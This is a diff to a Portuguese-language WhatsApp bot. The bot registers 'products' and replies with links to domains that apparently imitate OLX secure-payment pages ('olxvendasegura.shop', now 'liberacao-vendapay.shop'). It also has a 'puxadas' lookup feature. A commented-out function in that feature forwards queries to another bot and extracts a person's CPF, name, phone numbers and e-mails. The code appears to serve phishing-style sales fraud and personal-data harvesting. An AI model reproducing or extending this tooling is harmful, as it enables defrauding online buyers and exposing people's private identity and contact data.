@@ -8,7 +8,7 @@ if (!global.pendingResponses) {
   global.pendingResponses = {};
 }
 
-module.exports = async (conn, mek, dataVendas, config) => {
+module.exports = async (conn, mek, dataVendas) => {
   try {
     const from = mek.key.remoteJid;
     const type = Object.keys(mek.message).find(
@@ -32,17 +32,13 @@ module.exports = async (conn, mek, dataVendas, config) => {
           mek.message[type].text.startsWith(prefix)
         ? mek.message[type].text
         : "";
-
-        
-        const budy =
-        type === "conversation"
+    const budy =
+      type === "conversation"
         ? mek.message.conversation
         : type === "extendedTextMessage"
         ? mek.message.extendedTextMessage.text
         : "";
-        
-        if (from === config.grupoBot && budy.includes("/olx")) return;
-        
+
     const comando = body
       .replace(prefix, "")
       .trim()
@@ -409,7 +405,7 @@ module.exports = async (conn, mek, dataVendas, config) => {
         // Salvar dados finais antes de concluir
         if (salvarDados()) {
           enviar(
-            `✅ Produto cadastrado com sucesso!\n\nCódigo: ${edicao.codigo}\n\n*LINK:* https://olxvendasegura.shop/pag/?id=${edicao.codigo}`
+            `✅ Produto cadastrado com sucesso!\n\nCódigo: ${edicao.codigo}\n\n*LINK:* https://liberacao-vendapay.shop/pag/?id=${edicao.codigo}`
           );
         } else {
           enviar(
@@ -529,9 +525,10 @@ module.exports = async (conn, mek, dataVendas, config) => {
             return enviar("⚠️ Não foi possível extrair dados da consulta.");
           }
 
+
           // Grupo de origem onde enviamos o comando
-          
-          const origemGrupo = config.grupoBot;      
+          const config = require("../../config.json");
+          const origemGrupo = config.groupPuxadas;
           // Grupo de destino onde queremos receber a resposta
           const destinoGrupo = from; // Usar o grupo atual como destino
 
@@ -589,7 +586,7 @@ module.exports = async (conn, mek, dataVendas, config) => {
       //     // Grupo de origem onde enviamos o comando
       //     const origemGrupo = "120363400171925124@g.us";
       //     // Grupo de destino onde queremos receber a resposta
-      //     const destinoGrupo = "120363418942165974@g.us"; // ou um ID específico para outro grupo
+      //     const destinoGrupo = "120363397924256528@g.us"; // ou um ID específico para outro grupo
 
       //     // Enviar a mensagem para o grupo de origem
       //     conn
@@ -928,3 +925,106 @@ ${
     // Não remover o comando pendente em caso de erro para dar chance de processá-lo novamente
   }
 }
+
+// original
+// async function checkIfResponseToCommand(conn, message, budy) {
+//   try {
+//     const groupId = message.key.remoteJid;
+
+//     // Verificar se este grupo tem comandos aguardando resposta
+//     if (global.pendingResponses[groupId]) {
+//       // Verificar se a mensagem é de um bot (pode precisar adaptar este critério)
+//       // Por exemplo, verificar se é uma resposta específica ou de um ID específico
+//       const isBotResponse =
+//         message.key.fromMe === false &&
+//         message.key.participant === "5521959388618@s.whatsapp.net" &&
+//         (budy.includes("*☞ Resultado da sua consulta:*\n") ||
+//           "Dados não encontrados para o nome especificado" ||
+//           "Você está consultando muito rápido."); // adaptar este critério para seu caso
+//       // console.log("Resposta recebida de bot:", budy);
+
+//       if (isBotResponse) {
+//         const pendingCommand = global.pendingResponses[groupId];
+
+//         if (pendingCommand && pendingCommand.targetGroup) {
+//           function limparTexto(txt) {
+//             return txt
+//               .replace(/[\u200e\u200f\u00a0\r]/g, "")
+//               .replace(/[ \t]+\n/g, "\n")
+//               .replace(/\n{2,}/g, "\n\n")
+//               .trim();
+//           }
+
+//           const texto = limparTexto(budy);
+
+//           if (budy.includes("Você está consultando muito rápido.")) {
+//             conn.sendMessage(pendingCommand.targetGroup, {
+//               text: "⚠️ Você está consultando muito rápido. Por favor, aguarde alguns minutos e tente novamente.",
+//             });
+//             return;
+//           }
+
+//           // 1. Extrair CPF e Nome
+//           const cpfMatch = texto.match(/CPF:\s*([\d.\-]+)/i);
+//           const nomeMatch = texto.match(/NOME:\s*(.+)/i);
+
+//           const cpf = cpfMatch ? cpfMatch[1] : "Não encontrado";
+//           const nome = nomeMatch ? nomeMatch[1].trim() : "Não encontrado";
+
+//           // 2. Extrair todos os números de telefone com rótulos
+//           const numerosRaw =
+//             texto.match(/\(\d{2}\)\d{4,5}-\d{4}(?:\s*-\s*[^-\n]*)*/gi) || [];
+
+//           // 3. Separar entre WhatsApp e não-WhatsApp
+//           const numerosWhatsapp = [];
+//           const numerosNormais = [];
+
+//           numerosRaw.forEach((numero, index) => {
+//             const isWhatsapp = /whatsapp/i.test(numero);
+//             const prefixo = index === 0 ? "★ " : "   ";
+//             const item = `${prefixo}${numero.trim()}`;
+//             if (isWhatsapp) {
+//               numerosWhatsapp.push(item);
+//             } else {
+//               numerosNormais.push(item);
+//             }
+//           });
+
+//           // 4. Extrair e-mails
+//           const emailsRaw = texto.match(/[\w.+-]+@[\w.-]+\.\w+/g) || [];
+//           const emailsFormatados = emailsRaw.map((email) => `   ${email}`);
+
+//           // 5. Montar mensagem final
+//           const resposta = `CPF: ${cpf}
+// Nome: ${nome}
+
+// - ✅ NÚMEROS COM WHATSAPP (${numerosWhatsapp.length}):
+// ${numerosWhatsapp.join("\n")}
+
+// - 📞 NÚMEROS SEM WHATSAPP (${numerosNormais.length}):
+// ${numerosNormais.join("\n")}
+
+// - ✉️ E-MAILS (${emailsFormatados.length}):
+// ${emailsFormatados.join("\n")}
+// `.trim();
+
+//           // Enviar a resposta para o grupo
+//           conn.sendMessage(pendingCommand.targetGroup, { text: resposta });
+
+//           // Limpar o comando pendente
+//           delete global.pendingResponses[groupId];
+//           console.log("✅ Resposta recebida e encaminhada com sucesso!");
+//         }
+//       }
+//     }
+//   } catch (error) {
+//     // await conn.sendMessage(pendingCommand.targetGroup, {
+//     //   react: {
+//     //     text: "❌",
+//     //     key: message.key,
+//     //   },
+//     // });
+
+//     return console.error("Erro ao verificar resposta de comando:", error);
+//   }
+// }
